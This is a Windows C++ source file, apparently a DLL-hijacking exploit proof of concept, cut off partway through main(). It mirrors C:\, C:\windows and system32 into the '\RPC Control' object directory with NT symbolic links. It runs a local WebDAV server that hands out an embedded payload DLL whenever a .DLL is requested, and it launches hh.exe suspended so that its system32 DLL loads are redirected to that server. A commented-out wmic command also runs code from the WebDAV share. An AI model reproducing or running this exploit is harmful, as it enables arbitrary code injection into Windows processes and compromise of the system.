#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define ONECORE
#include <algorithm>
#include <iostream>
#include <memory>
#include <string>
#include <vector>
#include <array>
#include <unordered_map>
#include <set>
#include <functional>
#include <windows.h>
#include <http.h>
#include <stdio.h>
#include <fstream>
#include <thread>  
#include <sstream>
#include <processthreadsapi.h>
#include <filesystem>  
#include <regex>
#include <comdef.h>
#include <type_traits>
#include "resource.h"
#pragma comment(lib, "httpapi.lib")
using namespace std;
using namespace std::filesystem;
#ifndef NTSTATUS  
typedef ULONG NTSTATUS;
#endif
#define NT_SUCCESS( Status ) ( ((NTSTATUS)(Status)) >= 0 )
#define TOKENIZE(x) #x
struct abortError : public exception {
   using exception::exception; abortError(string e) : exception{ e.c_str() } { cout << e << endl; }
   abortError(wstring w) : abortError{ string{ w.begin(), w.end() } } {}
};
#define THROW_ON_ERR( CODE ) { auto RET =(CODE); if(!NT_SUCCESS(RET)){ auto err = wstring{ _com_error{ (HRESULT) RtlNtStatusToDosError(RET) }.ErrorMessage() };               \
                                                                       throw abortError{ ( string{ TOKENIZE(CODE) } + " returned: "s + string{ err.begin(), err.end() } ) };  \
                                                                     }                                                                                                        \
                             };

#define CONCAT( X, Y ) X##Y
template< typename modHandleType, typename procNameType >
auto getProcAddressOrThrow(modHandleType modHandle, procNameType procName) {
   auto address = GetProcAddress(modHandle, procName);
   if (address == nullptr) throw exception{ ("Error importing: "s + procName).c_str() };
   return address;
}
// Notice- the comma operator is used to make sure the dll is loaded, discard the result- then getModuleHandle is used
#define IMPORTAPI( DLLFILE, FUNCNAME, RETTYPE, ... )                                                                        \
   typedef RETTYPE( WINAPI* CONCAT( t_, FUNCNAME ) )( __VA_ARGS__ );                                                        \
   template< typename... Ts >                                                                                               \
   auto FUNCNAME( Ts... ts ) {                                                                                              \
      const static CONCAT( t_, FUNCNAME ) func =                                                                            \
       (CONCAT( t_, FUNCNAME )) getProcAddressOrThrow( ( LoadLibrary( DLLFILE ), GetModuleHandle( DLLFILE ) ), #FUNCNAME ); \
      return func( std::forward< Ts >( ts )... );                                                                           \
   }; 
IMPORTAPI(L"NTDLL.DLL", RtlNtStatusToDosError, HRESULT, NTSTATUS)

namespace NT {
   typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PCWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
}
using namespace NT;
namespace strings
{
   template< typename STR >
   struct str_addons
   {
      auto upperCase() { auto tmp = *static_cast<STR*>(this); std::transform(tmp.begin(), tmp.end(), tmp.begin(), ::toupper); return tmp; }
      auto replacesubstr(STR from, STR to) { return STR{ std::regex_replace(*static_cast<STR*>(this), std::regex(from), to) }; }
   };
   struct wstr : public wstring, str_addons< wstr > {
      using wstring::wstring;
      wstr(string s) : wstring{ s.begin(), s.end() } {}
      UNICODE_STRING uni;
      UNICODE_STRING* getUni() {
         uni = { static_cast< unsigned short >( size() * sizeof( wchar_t ) ), static_cast< unsigned short >( size() * sizeof(wchar_t) ), data() };
         return &uni;
      }
   };
   struct str : public string, str_addons< str > { using string::string; str(string s) :string{ s } {} str(wstring ws) : string{ ws.begin(), ws.end() } {} operator string() { return  *this; } };
   using strstream = std::basic_ostream< char, std::char_traits< char > >;

   strstream& operator<< (strstream& os, const std::wstring& ws) { return os << str{ ws }; }
   strstream& operator<< (strstream& os, const wchar_t* ws) { return os << str{ ws }; }
}
using namespace strings;

template< int RESID > auto getResource()
{
   HRSRC resourceHandle = FindResource(nullptr, MAKEINTRESOURCE(RESID), RT_RCDATA); if (resourceHandle == nullptr) throw std::exception{ "Could not find embedded payload resource" };
   HGLOBAL dataHandle = LoadResource(nullptr, resourceHandle); if (dataHandle == nullptr) throw std::exception{ "Could not load embedded payload resource" };
   DWORD resourceSize = SizeofResource(nullptr, resourceHandle); if (!resourceSize) throw std::exception{ "Embedded payload resource size is invalid( 0 )" };
   return str{ reinterpret_cast<const char*>(LockResource(dataHandle)) , resourceSize };
};
 
namespace files {
   struct dirEntry { const wstr filename;  const bool isDir; };
   using direntries = list< dirEntry >;

   struct filepath : public str {
      using str::str;
   private:
      str expandEnvStr(char* unexpanded) {
         vector<char>  expandedBuffer;
         expandedBuffer.resize( ExpandEnvironmentStringsA( unexpanded, nullptr, 0 ) );
         THROW_ON_ERR( ExpandEnvironmentStringsA( unexpanded, &expandedBuffer[0], static_cast< USHORT >( expandedBuffer.size() ) ) );
         return &expandedBuffer[0];
      }
   public:
      template< typename T > filepath(T t) : str{ expandEnvStr(t).replace("/"s , "\\"s).upperCase() } {}
      operator path() { return path{ this->c_str() }; }

      str readFile() {
         str filename = "C:\\"s.append(*this);
         if (!filesystem::exists(filename.c_str())) { throw exception{ "file no exist" }; }
         if (!filesystem::is_regular_file(path())) { return ""; }

         cout << "Opening: " << filename << " for returning";
         ifstream filecontent{ filename.c_str() , std::ios::binary };
         stringstream buffer;
         buffer << filecontent.rdbuf();
         return buffer.str();
      }

      direntries enumDir(str relativeTo = "C:\\\\"s, bool forwardSlashes = false) {
         if (!filesystem::exists(*this)) throw exception{ ("directory no exist:"s + *this).c_str() };
         if (filesystem::is_regular_file(*this)) {
            auto name = str{ *this };
            if (relativeTo != "") name = name.replacesubstr(relativeTo, "");
            if (forwardSlashes) name = name.replacesubstr("\\\\", "/");
            return { { name, 0 } };
         }
         direntries dirContent{   };
         for (const auto& f : directory_iterator{ path { *this  } }) {
            try {
               if (f.path().has_filename() && !f.is_symlink()) {
                  auto name = str{ f.path().filename().string() };

                  if (relativeTo != "") name = name.replacesubstr(relativeTo, "");
                  if (forwardSlashes) name = name.replacesubstr("\\\\", "/");

                  dirContent.emplace_back(name, f.is_directory());
               }
            }
            catch (std::exception& e) { cout << (e.what()) << endl; }
         }
         return dirContent;
      }
   };
}
using namespace files;
namespace processes {
   struct process {
      HANDLE hProcess;
      HANDLE hThread;
      process(wstr executable, wstr args = L"", wstr currDir = L"", bool suspended = false, HANDLE token = GetCurrentThreadToken()) {
         STARTUPINFO startInfo{ 0x00 };
         startInfo.cb = sizeof(startInfo);
         startInfo.wShowWindow = SW_SHOW;
         startInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

         PROCESS_INFORMATION procInfo = { 0x00 };
         HANDLE hToken = {};
         DuplicateTokenEx(token, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);
         if (CreateProcessAsUser(hToken, executable.c_str(), const_cast<wchar_t*>(args.c_str()), nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | (suspended ? CREATE_SUSPENDED : 0), nullptr, nullptr, &startInfo, &procInfo)) {
            hProcess = procInfo.hProcess;
            hThread = procInfo.hThread;
         }
         else throw std::exception{ ("Error executing: "s + str{executable}).c_str() };
      }
      ~process() { CloseHandle(hProcess); CloseHandle(hThread); }
   };
}
using namespace processes;
 
namespace NT
{
#ifndef INVALID_HANDLE_VALUE  
#define INVALID_HANDLE_VALUE (HANDLE)-1
#endif
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define OBJ_OPENIF           0x00000080L

   template<size_t N>
   struct StringLiteral { char value[N]; constexpr StringLiteral(const char(&str)[N]) { copy_n(str, N, value); } };

   typedef enum _OBJECT_INFORMATION_CLASS { ObjectBasicInformation = 0, ObjectNameInformation = 1, ObjectTypeInformation = 2, ObjectTypesInformation = 3, ObjectHandleFlagInformation = 4, ObjectSessionInformation = 5, MaxObjectInfoClass = 6 }OBJECT_INFORMATION_CLASS;
   struct OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; };
   struct OBJECT_NAME_INFORMATION { UNICODE_STRING Name; };
   enum EVENT_TYPE { NotificationEvent, SynchronizationEvent };

   IMPORTAPI(L"NTDLL.DLL", NtClose, NTSTATUS, HANDLE)
   IMPORTAPI(L"NTDLL.DLL", NtDuplicateObject, NTSTATUS, HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options)
   IMPORTAPI(L"NTDLL.DLL", NtMakeTemporaryObject, NTSTATUS, HANDLE, PLONG)
   IMPORTAPI(L"NTDLL.DLL", NtMakePermanentObject, NTSTATUS, HANDLE)
   IMPORTAPI(L"NTDLL.DLL", NtQueryObject, NTSTATUS, HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG)
   IMPORTAPI(L"NTDLL.DLL", NtSetEvent, NTSTATUS, HANDLE, PLONG)

   struct any { template<typename T> operator T() { return T{}; } };

   struct params
   {
      HANDLE RootDirectory = 0;
      wstr ObjectName;
      ULONG Attributes = (OBJ_OPENIF | OBJ_CASE_INSENSITIVE);
      ACCESS_MASK DesiredAccess = MAXIMUM_ALLOWED;
   };

   template< typename SPECTYPE>
   class NTObj {
   private:
      HANDLE privHandle = INVALID_HANDLE_VALUE;
   protected:
      NTObj(HANDLE h) : privHandle{ h ? h : throw abortError{} } {}
   public:
      ~NTObj() { if (privHandle != INVALID_HANDLE_VALUE) { NtClose(privHandle); } }
      NTObj(const NTObj& other) {
         THROW_ON_ERR(NtDuplicateObject(GetCurrentProcess(), other.privHandle, GetCurrentProcess(), &privHandle, 0, (OBJ_OPENIF | OBJ_CASE_INSENSITIVE), DUPLICATE_SAME_ACCESS));
      }
      auto getHandle() { return privHandle; }

      template< StringLiteral NTFUNC, typename ...REQUIREDARGS  >
      static auto make(params p, REQUIREDARGS ... ra) {
         using syscallSignature = NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES*, REQUIREDARGS ...);                                                                                     \
         const static syscallSignature ntFunc = (syscallSignature)GetProcAddress(GetModuleHandle(L"ntdll.dll"), str{ NTFUNC.value }.c_str());
         OBJECT_ATTRIBUTES oa{ sizeof(OBJECT_ATTRIBUTES), p.RootDirectory,p.ObjectName.getUni() ,p.Attributes,0,0 };
         HANDLE h;
         THROW_ON_ERR(ntFunc(&h, p.DesiredAccess, &oa, forward< REQUIREDARGS>(ra)...));
         return NTObj{ h };
      }

      wstr getNTPath() {
         DWORD bufferlen = 0;
         OBJECT_NAME_INFORMATION* name = NULL;
         NtQueryObject(privHandle, ObjectNameInformation, name, bufferlen, &bufferlen);
         if (bufferlen) {
            name = reinterpret_cast<OBJECT_NAME_INFORMATION*>(new BYTE[bufferlen]);
            NtQueryObject(privHandle, ObjectNameInformation, name, bufferlen, &bufferlen);
            return { name->Name.Buffer };
         }
         throw exception("Could not retreive object name");
      }
      void makePerm() { THROW_ON_ERR(NtMakePermanentObject(privHandle)); }
      void makeTemp() { THROW_ON_ERR(NtMakeTemporaryObject(privHandle)); }
      auto waitForSignal(DWORD timeout = INFINITE) { return WaitForSingleObject(privHandle, timeout); }
      auto signalPulse() { LONG prevState = 0; THROW_ON_ERR(NtSetEvent(privHandle, &prevState)); return prevState; }
   };

   class ntEvent : public NTObj< ntEvent > {
   public:
      static auto make(params p, EVENT_TYPE h, BOOLEAN u) { return NTObj< ntEvent>::make<"NtCreateEvent", EVENT_TYPE, BOOLEAN >(p, h, u); }
   };

   struct ntObjDir : private NTObj< ntObjDir> {
      static auto make(params p) { return NTObj< ntObjDir>::make< "NtOpenDirectoryObject" >(p); }
      static auto make(params p, HANDLE h, ULONG u) {
         return NTObj< ntObjDir>::make< "NtCreateDirectoryObjectEx", HANDLE, ULONG >(p, h, u);
      }
   };
   struct ntSymLink : private NTObj< ntSymLink > {
      static auto make(params p) { return NTObj< ntSymLink>::make< "NtOpenSymbolicLinkObject" >(p); }
      static auto make(params p, PUNICODE_STRING u) {
         return NTObj< ntSymLink >::make<"NtCreateSymbolicLinkObject", PUNICODE_STRING >(p, u);
      }
   };

   typedef struct _PROCESS_DEVICEMAP_INFORMATION { HANDLE DirectoryHandle; } PROCESS_DEVICEMAP_INFORMATION;
   typedef enum   _PROCESSINFOCLASS { ProcessBasicInformation = 0, ProcessQuotaLimits = 1, ProcessIoCounters = 2, ProcessVmCounters = 3, ProcessTimes = 4, ProcessBasePriority = 5, ProcessRaisePriority = 6, ProcessDebugPort = 7, ProcessExceptionPort = 8, ProcessAccessToken = 9, ProcessLdtInformation = 10, ProcessLdtSize = 11, ProcessDefaultHardErrorMode = 12, ProcessIoPortHandlers = 13, ProcessPooledUsageAndLimits = 14, ProcessWorkingSetWatch = 15, ProcessUserModeIOPL = 16, ProcessEnableAlignmentFaultFixup = 17, ProcessPriorityClass = 18, ProcessWx86Information = 19, ProcessHandleCount = 20, ProcessAffinityMask = 21, ProcessPriorityBoost = 22, ProcessDeviceMap = 23, ProcessSessionInformation = 24, ProcessForegroundInformation = 25, ProcessWow64Information = 26, ProcessImageFileName = 27, ProcessLUIDDeviceMapsEnabled = 28, ProcessBreakOnTermination = 29, ProcessDebugObjectHandle = 30, ProcessDebugFlags = 31, ProcessHandleTracing = 32, ProcessIoPriority = 33, ProcessExecuteFlags = 34, ProcessTlsInformation = 35, ProcessCookie = 36, ProcessImageInformation = 37, ProcessCycleTime = 38, ProcessPagePriority = 39, ProcessInstrumentationCallback = 40, ProcessThreadStackAllocation = 41, ProcessWorkingSetWatchEx = 42, ProcessImageFileNameWin32 = 43, ProcessImageFileMapping = 44, ProcessAffinityUpdateMode = 45, ProcessMemoryAllocationMode = 46, ProcessGroupInformation = 47, ProcessTokenVirtualizationEnabled = 48, ProcessOwnerInformation = 49, ProcessWindowInformation = 50, ProcessHandleInformation = 51, ProcessMitigationPolicy = 52, ProcessDynamicFunctionTableInformation = 53, ProcessHandleCheckingMode = 54, ProcessKeepAliveCount = 55, ProcessRevokeFileHandles = 56, ProcessWorkingSetControl = 57, ProcessHandleTable = 58, ProcessCheckStackExtentsMode = 59, ProcessCommandLineInformation = 60, ProcessProtectionInformation = 61, ProcessMemoryExhaustion = 62, ProcessFaultInformation = 63, ProcessTelemetryIdInformation = 64, ProcessCommitReleaseInformation = 65, ProcessDefaultCpuSetsInformation = 66, ProcessAllowedCpuSetsInformation = 67, ProcessReserved1Information = 66, ProcessReserved2Information = 67, ProcessSubsystemProcess = 68, ProcessJobMemoryInformation = 69, ProcessInPrivate = 70, ProcessRaiseUMExceptionOnInvalidHandleClose = 71, ProcessIumChallengeResponse = 72, ProcessChildProcessInformation = 73, ProcessHighGraphicsPriorityInformation = 74, ProcessSubsystemInformation = 75, ProcessEnergyValues = 76, ProcessPowerThrottlingState = 77, ProcessReserved3Information = 78, ProcessWin32kSyscallFilterInformation = 79, ProcessDisableSystemAllowedCpuSets = 80, ProcessWakeInformation = 81, ProcessEnergyTrackingState = 82, ProcessManageWritesToExecutableMemory = 83, ProcessCaptureTrustletLiveDump = 84, ProcessTelemetryCoverage = 85, ProcessEnclaveInformation = 86, ProcessEnableReadWriteVmLogging = 87, ProcessUptimeInformation = 88, ProcessImageSection = 89, ProcessDebugAuthInformation = 90, ProcessSystemResourceManagement = 91, ProcessSequenceNumber = 92, ProcessReserved4Information = 93, ProcessSecurityDomainInformation = 94, ProcessCombineSecurityDomainsInformation = 95, ProcessEnableLogging = 96, ProcessLeapSecondInformation = 97, ProcessFiberShadowStackAllocation = 98, ProcessFreeFiberShadowStackAllocation = 99, ProcessAltSystemCallInformation = 100, ProcessDynamicEHContinuationTargets = 101, ProcessDynamicEnforcedCetCompatibleRanges = 102, ProcessCreateStateChange = 103, ProcessApplyStateChange = 104, ProcessEnableOptionalXStateFeatures = 105, MaxProcessInfoClass = 106 } PROCESSINFOCLASS;

   IMPORTAPI(L"NTDLL.DLL", NtSetInformationProcess, NTSTATUS, HANDLE, PROCESSINFOCLASS, PVOID, ULONG)
}
using namespace NT;

namespace httpd
{
#define REQUEST_SIZE ( sizeof( HTTP_REQUEST ) + 2048 )
   auto ready = ntEvent::make({ .ObjectName = wstr{ L"\\BaseNamedObjects\\httpdready" } }, NotificationEvent, false);
   auto servedPayload = ntEvent::make({ .ObjectName = wstr{ L"\\BaseNamedObjects\\servedPayload" } }, NotificationEvent, false);
   auto stoppedDllHijack = ntEvent::make({ .ObjectName = wstr{ L"\\BaseNamedObjects\\stoppedDllHijack" } }, NotificationEvent, false);

   std::unordered_map< unsigned int, std::string> http_status{ {100, "Continue"}, {101, "Switching_Protocol"}, {102, "Processing"}, {103, "Early_Hints"}, {200, "OK"}, {201, "Created"}, {202, "Accepted"}, {203, "Non_Authoritative_Information"}, {204, "No_Content"}, {205, "Reset_Content"}, {206, "Partial_Content"}, {207, "Multi_Status"}, {208, "Already_Reported"}, {226, "IM_Used"}, {300, "Multiple_Choices"}, {301, "Moved_Permanently"}, {302, "Found"}, {303, "See_Other"}, {304, "Not_Modified"}, {305, "Use_Proxy"}, {306, "Switch_Proxy"}, {307, "Temporary_Redirect"}, {308, "Permanent_Redirect"}, {400, "Bad_Request"}, {401, "Unauthorized"}, {402, "Payment_Required"}, {403, "Forbidden"}, {404, "Not_Found"}, {405, "Method_Not_Allowed"}, {406, "Not_Acceptable"}, {407, "Proxy_Authentication_Reqired"}, {408, "Request_Timeout"}, {409, "Conflict"}, {410, "Gone"}, {411, "Length_Required"}, {412, "Precondition_Failed"}, {413, "Payload_Too_Large"}, {414, "URI_Too_Long"}, {415, "Unsupported_Media_Type"}, {416, "Range_Not_Satisfiable"}, {417, "Expectation_Failed"}, {418, "Im_a_teapot"}, {421, "Misdirected_Request"}, {422, "Unprocessable_Entity"}, {423, "Locked"}, {424, "Failed_Dependency"}, {425, "Too_Early"}, {426, "Upgrade_Required"}, {428, "Precondition_Required"}, {429, "Too_Many_Requests"}, {431, "Request_Header_Fields_Too_Large"}, {451, "Unavailable_For_Legal_Reasons"}, {500, "Internal_Server_Error"}, {501, "Not_Implemented"}, {502, "Bad_Gateway"}, {503, "Service_Unavailable"}, {504, "Gateway_Timeout"}, {505, "HTTP_Version_Not_Supported"}, {506, "Variant_Also_Negotiates"}, {507, "Insufficient_Storage"}, {508, "Loop_Detected"}, {510, "Not_Extended"}, {511, "Network_Authentication_Required"} };
   constexpr static const std::array< const std::array< char, 20 >, HttpVerbMaximum + 1 > verbs{ "", "Unknown", "Invalid", "OPTIONS",  "GET", "HEAD", "POST", "PUT","DELETE", "TRACE", "CONNECT", "TRACK",  "MOVE", "COPY", "PROPFIND", "PROPPATCH", "MKCOL", "LOCK","UNLOCK", "SEARCH" };

   class REQUEST {
   private:
      std::unique_ptr< char[] > buf{ new char[REQUEST_SIZE] };
   public:
      HTTP_REQUEST_ID requestId;
      REQUEST() { HTTP_SET_NULL_ID(&requestId); get()->RequestId = requestId; }
      PHTTP_REQUEST get() { return (PHTTP_REQUEST)(&buf.get()[0]); }
   };

   class request_response {
   private:
      vector< std::pair< std::string, std::string > > headers;
      array< std::string, HttpHeaderResponseMaximum > knownheaders;
   public:
      const HANDLE h;
      const HTTP_REQUEST_ID responseTo;
      const HTTP_VERB requestVerb;
      const string httphost, url;

      request_response(HANDLE h, HTTP_REQUEST_ID id, HTTP_VERB requestVerb, string httphost, string url) : h{ h }, responseTo{ id }, requestVerb{ requestVerb }, httphost{ httphost }, url{ url } { }

      void setResponseHeader(HTTP_HEADER_ID id, const char* val) { knownheaders[id] = val; }
      void setResponseHeader(str name, str val) { headers.emplace_back(name, val); }

      auto sendResponse(int statuscode, str responsetext)
      {
         HTTP_RESPONSE response{ 0x00 };
         for (int i = 0; i < knownheaders.size(); i++) {
            response.Headers.KnownHeaders[i].pRawValue = knownheaders[i].c_str();
            response.Headers.KnownHeaders[i].RawValueLength = static_cast<unsigned short>(knownheaders[i].size());
         }
         response.StatusCode = statuscode;
         response.pReason = http_status.at(statuscode).c_str();
         response.ReasonLength = static_cast<USHORT>(strlen(response.pReason));

         str contentLengthHeader = to_string(responsetext.size());
         response.Headers.KnownHeaders[HttpHeaderContentLength].pRawValue = contentLengthHeader.c_str();
         response.Headers.KnownHeaders[HttpHeaderContentLength].RawValueLength = static_cast<unsigned short>(contentLengthHeader.size());

         HTTP_UNKNOWN_HEADER unknowsheaders[10]{ 0x00 };
         for (int i = 0; i < headers.size(); i++)
         {
            unknowsheaders[i] = HTTP_UNKNOWN_HEADER{ static_cast<unsigned short>(headers.at(i).first.size()),
                                                      static_cast<unsigned short>(headers.at(i).second.size()),
                                                      headers.at(i).first.c_str(),
                                                      headers.at(i).second.c_str()
            };
         }
         response.Headers.pUnknownHeaders = unknowsheaders;
         response.Headers.UnknownHeaderCount = static_cast<unsigned short>(headers.size());
         THROW_ON_ERR(HttpSendHttpResponse(h, responseTo, (responsetext.size() ? HTTP_SEND_RESPONSE_FLAG_MORE_DATA : 0), &response, NULL, NULL, NULL, 0, NULL, NULL));
         if (responsetext.size()) {
            HTTP_DATA_CHUNK dataChunk{ HttpDataChunkFromMemory, (void*)responsetext.c_str(), static_cast<unsigned short>(responsetext.size()) };
            THROW_ON_ERR(HttpSendResponseEntityBody(h, responseTo, 0, 1, &dataChunk, NULL, NULL, 0, NULL, NULL));
         }
      }
   };
   bool httpdActive = true;
   template< typename HTTPPROCESSOR >
   struct httpd {
      const wstr url, port, hostname;
      HANDLE listeningHandle;
      auto getListeningProtoHostUrl() { return wstr{ L"http://"s + hostname + ((port != L""s) ? L":"s : L""s) + port + L"/"s + url }; }
      httpd(wstr hostname, wstr url, wstr port, HTTPPROCESSOR processor) : hostname{ hostname }, url{ url }, port{ port }
      {
         THROW_ON_ERR(HttpCreateHttpHandle(&listeningHandle, 0));
         THROW_ON_ERR(HttpAddUrl(listeningHandle, getListeningProtoHostUrl().c_str(), NULL));

         cout << "Listening on: " << getListeningProtoHostUrl() << " - connect to \\\\" << hostname << "@" << port << "\\" << url << endl;
         ready.signalPulse();
         while (httpdActive)
         {
            REQUEST pRequest;
            THROW_ON_ERR(HttpReceiveHttpRequest(listeningHandle, pRequest.get()->RequestId, 0, pRequest.get(), REQUEST_SIZE, NULL, NULL));
            cout << "Got a " << verbs.at(pRequest.get()->Verb).data() << " request for " << pRequest.get()->CookedUrl.pFullUrl << endl;
            processor(request_response{ listeningHandle, pRequest.get()->RequestId, pRequest.get()->Verb , ("http://"s + str{hostname} + ":"s + str{ port } + "/"s), str{ pRequest.get()->CookedUrl.pAbsPath }.substr(1) });
         }
      }
      ~httpd() { THROW_ON_ERR(HttpRemoveUrl(listeningHandle, getListeningProtoHostUrl().c_str())); }
   };
   template< typename HTTPPROCESSOR > httpd(wstr, wstr, wstr, HTTPPROCESSOR)->httpd< HTTPPROCESSOR >;

   struct httpengine {
      httpengine() { HttpInitialize(HTTPAPI_VERSION_2, HTTP_INITIALIZE_SERVER, NULL); }
      ~httpengine() { HttpTerminate(HTTP_INITIALIZE_SERVER, 0); }
   } engineInstance;

   namespace webdav
   {
      class xml {
         const static inline str LOCKS = R""""( <D:lockdiscovery/><D:ishidden>0</D:ishidden>
				                                 <D:supportedlock>
					                                <D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry>
					                                <D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry>
				                              </D:supportedlock>)""""s;

         static auto xmlContainer(string rooturl) {
            return R""""(  <D:response><D:href>)"""" + rooturl + R""""(</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>Tue, 12 Oct 2021 20:38:18 GMT</D:getlastmodified>
                        )"""" + LOCKS + R""""(
                        <D:getetag/><D:displayname>/</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength>
                        <D:iscollection>1</D:iscollection><D:creationdate>2021-08-20T14:42:43.702Z</D:creationdate><D:resourcetype><D:collection/></D:resourcetype>
                     </D:prop></D:propstat></D:response>)"""";
         };
         static auto xmlEntry(str rooturl, str filename, bool isdir) {
            return R""""(  <D:response><D:href>)"""" + rooturl + filename + (isdir ? "/"s : ""s) + R""""(</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop>
                        <D:getcontenttype>)"""" + (isdir ? ""s : "application/octet-stream"s) + R""""(</D:getcontenttype><D:getlastmodified>Fri, 20 Aug 2021 16:51:11 GMT</D:getlastmodified>)"""" + LOCKS + R""""(
                        <D:getetag></D:getetag><D:displayname>)"""" + filename + R""""(</D:displayname><D:getcontentlanguage/><D:getcontentlength>5</D:getcontentlength>
                        <D:iscollection>)"""" + (isdir ? "1"s : "0"s) + R""""(</D:iscollection><D:creationdate>2021-08-20T16:51:11.724Z</D:creationdate><D:resourcetype>)"""" + (isdir ? "<D:collection />"s : " "s) + R""""(</D:resourcetype>
                     </D:prop></D:propstat></D:response>)"""";
         };
      public:
         static auto makexml(str rooturl, direntries entries) {
            auto xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?><D:multistatus xmlns:D=\"DAV:\">"s + (entries.size() ? "" : xmlContainer(rooturl));
            for (auto& f : entries) { xml = xml + xmlEntry(rooturl, f.filename, f.isDir); }
            return xml + "</D:multistatus>"s;
         }
      };

      std::thread webdav{ []() {
         httpd d{ L"LOCALHOST", L"" , L"8990", [&](request_response r) { try {
            switch (r.requestVerb) {
               case HttpVerbOPTIONS:
                  r.setResponseHeader("MS-Author-Via", "DAV");
                  r.setResponseHeader("X-Content-Type-Options", "nosniff");
                  r.setResponseHeader(HttpHeaderAllow, "OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK");
                  r.setResponseHeader("DAV", "1,2,3");
                  r.setResponseHeader("Public", "OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK");
                  r.sendResponse(200, "");
               break;
               case HttpVerbPROPFIND:
                  r.setResponseHeader(HttpHeaderContentType , "text/xml");
                  {
                     direntries content;
                     
                     try {
                        auto dircontent = filepath{ str{ "C:\\" } + str{r.url}.replacesubstr("DAVWWWROOT"s,""s) }.enumDir("C:\\\\", true);
                        for (auto& f : dircontent) { content.push_back(f);  cout << f.filename << endl; }
                     }
                     catch (...) {}
                     r.sendResponse((content.size() ? 200 : 404), xml::makexml(r.httphost, content));
                  }
               break;
               case HttpVerbHEAD: case HttpVerbDELETE: case HttpVerbPROPPATCH: case HttpVerbPUT: case HttpVerbLOCK: case HttpVerbMKCOL:
                  r.setResponseHeader(HttpHeaderContentType, "text/xml");
                  r.sendResponse(200, "");
               break;
               case HttpVerbGET:
                  if (str(r.url).upperCase().ends_with(".DLL"))
                  {
                     r.setResponseHeader(HttpHeaderContentType, "application/octet-stream");
                     r.setResponseHeader("Content-Disposition", "attachment; filename=\"" + r.url + "\"");
                     r.sendResponse(200, getResource<PAYLOADDLL>());
                     cout << "served payload as " << r.url << endl;
                     servedPayload.signalPulse();
                     httpdActive = false;
                     stoppedDllHijack.waitForSignal();
                  }
                  else
                  {
                      auto response = filepath{ r.url }.readFile();
                   //  auto response = filepath{ "windows\\system32\\cmd.exe" }.readFile();
                     r.setResponseHeader(HttpHeaderContentType, "application/octet-stream");
                     r.setResponseHeader("Content-Disposition", "attachment; filename=\"" +  r.url + "\"");
                     cout << "served " << r.url << " by webdav " << endl;
                     r.sendResponse(200, response);
                  }
               break;
               default:
                  std::cout << "Unexspected verb" << std::endl;
                  r.setResponseHeader(HttpHeaderContentType, "text/html");
                  r.sendResponse(200 , "");
            }
         }
         catch (abortError& e) { cout << e.what() << endl; }
         catch (...) {} } };
      } };
   }
}
struct mirrordir {
   wstr primaryPath;
   NTObj <ntObjDir> secondary;
   NTObj <ntObjDir>  primary;
   vector<NTObj< ntSymLink > > forwarders;
   mirrordir(filepath path) :
      primaryPath{ ("\\RPC Control\\"s + path.replacesubstr("\\\\","")) },
      secondary{ ntObjDir::make({.ObjectName = wstr{ ("\\RPC Control\\secondary"s + path.replacesubstr("\\\\","")) }}, 0, 0) },
      primary{ ntObjDir::make({.ObjectName = primaryPath}, secondary.getHandle(), 0) }     {
      for (const auto& f : path.enumDir()) {
         forwarders.emplace_back(
            ntSymLink::make({ .RootDirectory = secondary.getHandle(), .ObjectName = wstr{  f.filename } }, wstr{ L"\\global??\\"s + wstr{path.c_str()} +   f.filename }.getUni())
         );
      }
   }
   auto insert(wstr filename, wstr destination) {
      return forwarders.emplace_back(
         ntSymLink::make({ .RootDirectory = primary.getHandle(), .ObjectName = filename }, destination.getUni())
      );
   }
};
#if _DEBUGXX
static const auto  orgCout = std::cout.rdbuf([]() {
   static struct streamfwd : public std::streambuf {
      virtual int_type overflow(int_type c = EOF) {
         char str[]{ static_cast<char>(c), 0x00 }; OutputDebugStringA(str);
         return std::char_traits< char >::int_type{ c };
      }
   } dbgout;
   return &dbgout;
   }());
#endif
 
int main()
try {

   mirrordir cdir{ filepath{"c:\\"} };
   mirrordir windowsdir{ filepath{"c:\\windows\\"} };
   mirrordir system32dir{ filepath{"c:\\windows\\system32\\"} };
   cdir.insert(L"windows", windowsdir.primaryPath);
   windowsdir.insert(L"system32", system32dir.primaryPath);

   httpd::ready.waitForSignal();
 //  getchar();

 // auto p= process(L"cmd /c wmic process call create \\\\LOCALHOST@8990\\\davwwwroot\\windows\\system32\\cmd.exe", L"", L"c:\\windows\\system32", false);


   auto suspended = process(L"c:\\windows\\hh.exe", L"", L"c:\\windows\\system32", true);
   {
      auto RPCControlDir = ntObjDir::make({ .ObjectName = wstr{L"\\RPC Control"} });
      for (const auto& f : filepath{ "C:\\windows\\system32" }.enumDir()) {
         if (wstr{ f.filename.c_str() }.upperCase().ends_with(L".DLL")) {
            system32dir.insert(f.filename, wstr{ L"\\device\\mup\\;WebDavRedirector\\localhost@8990\\davwwwroot\\windows\\system32\\"s + f.filename });
         }
      }

